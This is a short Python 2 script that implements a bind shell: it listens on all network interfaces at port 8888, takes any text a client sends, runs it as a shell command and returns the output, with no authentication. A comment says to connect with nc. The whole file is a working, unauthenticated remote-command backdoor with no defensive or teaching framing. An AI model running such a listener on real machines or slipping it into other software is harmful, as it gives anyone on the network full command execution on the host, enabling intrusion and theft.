#!/usr/bin/python
''' Connect using "nc 127.0.0.1 8888"'''

import socket
import sys
import os
import subprocess

HOST = ''   # Symbolic name, meaning all available interfaces
PORT = 8888 # Arbitrary non-privileged port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

try:
    s.bind((HOST, PORT))
except socket.error as msg:
    print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()
s.listen(1)

#now keep talking with the client
while True:
    #wait to accept a connection - blocking call
    conn, addr = s.accept()
    print 'Connected with ' + addr[0] + ':' + str(addr[1])
    while True:
        data = conn.recv(1024)
        if not data:
            break
        try:
            out = subprocess.check_output(data, shell=True)
            if out:
                conn.send(out)
        except:
            conn.send("Command not found\n")
s.close()
